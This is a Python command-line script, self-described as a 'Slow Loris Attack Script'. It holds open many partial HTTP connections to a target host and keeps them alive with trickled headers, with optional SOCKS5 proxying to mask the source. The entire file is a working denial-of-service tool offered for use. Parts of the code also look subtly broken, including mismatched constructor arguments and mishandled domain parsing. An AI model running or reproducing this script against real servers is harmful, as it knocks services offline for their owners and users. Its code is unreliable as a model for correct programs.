import socket
import sys
import argparse
import random
import re
from time import sleep

#arg parse stuff
argparser = argparse.ArgumentParser(prog="sloris", description="Slow Loris Attack Script")

argparser.add_argument("domain", nargs="?", type=str, help="Host to test")

#default for http is 80
argparser.add_argument("-p", "--port", type=int, default=8080, help="Port")

#time to keep connection alive, default is 4 seconds
argparser.add_argument("-a", "--alivetime", type=int, default=12, help="Keep Alive Time")

#sleep time, default is 1 second
argparser.add_argument("-t", "--sleeptime", type=int, default=10, help="Time to sleep")

#number of sockets, default is 200
argparser.add_argument("-s", "--socket", type=int, default=200, help="# of sockets")

#socks5 proxy
argparser.add_argument("-5", "--socks5", nargs="?", type=str, help="Socks5 proxy")

#socks5 port
argparser.add_argument("-5p", "--socks5port", type=int, default=1080, help="Socks5 port")

parser = argparser.parse_args()

#if its 1 or less then poop pants
if len(sys.argv) <= 1:
    argparser.print_help()
    sys.exit(1)


#if no domain then poop pants
if not parser.domain:
    print("Need To Specify A Host")
    argparser.print_help()
    sys.exit(1)


#choose a random line from a file
def random_line(name):
    #choses a random line by splitting them and then choosing one
    with open(name) as f:
        lines = f.read().splitlines()
        return random.choice(lines)



#the part that does the actual logic except the arg stuff
def main():
    #matches the entire string for after the / in the domain
    extension = re.search(r"\/(.+)?", parser.domain[0])
    
    #if the extension is null then make it /
    if not extension:
        extension = "/"

    #deletes the extension and then leaves the domain
    domain = parser.domain[0].replace(extension, "")

    slist = []

    #initializes the list
    print("Socket Initialization\nThere Are {} Sockets".format(parser.socket))
    for i in range(parser.socket):
        slist.append(slsock(domain))

    #actual keep alive list
    print("Sending Keep Alives\nThere Are {} Sockets".format(len(slist)))
    while True:
        try:
            for s in slist:
                try:
                    s.keepAlive()

                except socket.error as e:
                    print("Error {}".format(e))
                    s.close()
                    slist.remove(s)

                    print("Recreating Pooped Socket")
                    slist.append(slsock(domain, extension))

        except KeyboardInterrupt:
            print("\nQuiting Slow Loris")
            print("Thank You, Bye")
            break

        sleep(parser.sleeptime)


#decided to use a socket object in the long run because it makes it cleaner and more extendable
class slsock(object):
    #init and send for each socket
    def __init__(self, domain):
        try:

            #place holder to get around scope
            self.sock = 0

            #if there is a socks proxy
            if parser.socks5:
                import socks
                self.sock = socks.socksocket(socks.AF_INET, socks.SOCK_STREAM)
                #setting proxy type socks5, proxy address, proxy port
                self.sock.set_proxy(socks.SOCKS5, parser.socks5, parser.socks5port)

            #if there is no proxy, just use normal socket
            else:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            #set the time out time default 5
            self.sock.settimeout(parser.alivetime)

            #no bind because you dont want the os to get confused
            self.sock.connect((domain, int(parser.port)))

            #sending the get request
            self.sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,1000)).encode("UTF-8"))

            #the user agent line
            #picks a random user agent and then puts it in
            self.sock.send("User-Agent: {}\r\n".format(random_line("useragents")).encode("UTF-8"))

            #accepted langs line
            self.sock.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("UTF-8"))
        #this will catch normal socket errors, general proxy issues, authentication issues, and problems with the proxy
        except (socket.error, socks.GeneralProxyError, socks.SOCKS5AuthError, socks.SOCKS5Error) as e:
            print("Init Error: ", e)

    #sending the keep alives
    def keepAlive(self):
        #sends the keep alive header for random amount of time
        self.sock.send("X-a: {}\r\n".format(random.randint(1,5000)).encode("UTF-8"))

    #closes the socket
    def close(self):
        self.sock.close()



if __name__ == "__main__":
    main()

